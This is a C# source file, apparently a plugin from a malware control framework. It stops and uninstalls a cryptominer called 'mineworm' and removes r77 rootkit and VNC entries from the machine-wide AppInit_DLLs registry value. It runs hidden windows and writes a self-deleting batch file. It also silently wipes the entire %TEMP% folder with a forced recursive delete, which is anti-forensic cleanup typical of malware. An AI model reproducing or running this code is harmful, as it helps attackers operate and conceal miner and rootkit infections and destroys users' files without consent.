using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Plugin.Handle
{
    public class KillPig
    {


        public KillPig()
        {
            string pathm = Path.Combine(Path.GetTempPath(), "mineworm");
            if (File.Exists(Path.Combine(pathm, "KillPegMIn.exe")))
            {
                Task.Run(() => Process.Start(Path.Combine(pathm, "KillPegMIn.exe"))).Wait();
            }
            else
            {
                Task.Run(() => KillMiner()).Wait();

            }
            
        }
        public static void KillMiner()
        {

            System.IO.StreamWriter file = new System.IO.StreamWriter(Path.Combine(Path.GetTempPath(), "delexec.bat"));
            file.WriteLine("taskkill /im \"mineworm.exe\" /f & exit");
            file.WriteLine("DEL  %exeFile%");
            file.WriteLine("DEL \"%~f0\"");
            file.Close();
            string chv = Path.Combine(Path.Combine(Path.GetTempPath(), "delexec.bat"));
            Process.Start(new ProcessStartInfo
            {
                FileName = chv,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                UseShellExecute = true,
                ErrorDialog = false,
            }).WaitForExit();
            string pathm = Path.Combine(Path.GetTempPath(), "mineworm");
            Directory.Delete(pathm, true);
            cleantemp();
            Task.Run((Action)RemoveKitRoot).Wait();
            try
            {
                foreach (Process proc in Process.GetProcessesByName("minerd"))
                {
                    proc.Kill();
                }
                foreach (Process proc in Process.GetProcessesByName("minewormwork"))
                {
                    proc.Kill();
                }
                foreach (Process proc in Process.GetProcessesByName("mineworm"))
                {
                    proc.Kill();
                }
                foreach (Process proc in Process.GetProcessesByName("mineworm.exe"))
                {
                    proc.Kill();
                }
            }
            catch
            {
                //MessageBox.Show(ex.Message);
            }
        }
        public static void DeleteDirectory(string target_dir)
        {
            string[] files = Directory.GetFiles(target_dir);
            string[] dirs = Directory.GetDirectories(target_dir);

            foreach (string file in files)
            {
                File.SetAttributes(file, FileAttributes.Normal);
                File.Delete(file);
            }

            foreach (string dir in dirs)
            {
                DeleteDirectory(dir);
            }

            Directory.Delete(target_dir, false);
        }

        public static void cleantemp()
        {

            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd",
                Arguments = $"/k start /b del /q/f/s %TEMP%\\* & exit",
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                UseShellExecute = true,
                ErrorDialog = false,
            });

        }
        static void RemoveKitRoot()
        {

            try
            {
#pragma warning disable CS0219 // The variable 'removed' is assigned but its value is never used
                bool removed = false;
#pragma warning restore CS0219 // The variable 'removed' is assigned but its value is never used

                foreach (bool is64bit in new[] { true, false })
                {
                    using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, is64bit ? RegistryView.Registry64 : RegistryView.Registry32).OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows", true))
                    {
                        if ((key.GetValue("AppInit_DLLs", "") as string).Contains("$77-"))
                        {
                            key.SetValue("AppInit_DLLs", "");
                            removed = true;
                        }
                        else if ((key.GetValue("AppInit_DLLs", "") as string).Contains("winvnc"))
                        {
                            key.SetValue("AppInit_DLLs", "");
                            removed = true;
                        }
                        else if ((key.GetValue("AppInit_DLLs", "") as string).Contains("mineworm"))
                        {
                            key.SetValue("AppInit_DLLs", "");
                            removed = true;
                        }
                        else if ((key.GetValue("AppInit_DLLs", "") as string).Contains("minerd"))
                        {
                            key.SetValue("AppInit_DLLs", "");
                            removed = true;
                        }
                    }
                }

                //MessageBox.Show(removed ? "r77 was now removed from AppInit_DLLs." : "r77 was not found in AppInit_DLLs.", "Information", MessageBoxButton.OK, MessageBoxImage.Information);
            }
            catch
            {
                //MessageBox.Show(ex.GetType() + ": " + ex.Message + "\r\n" + ex.StackTrace, "Error", MessageBoxButton.OK, MessageBoxImage.Error);
            }

        }
    }
}
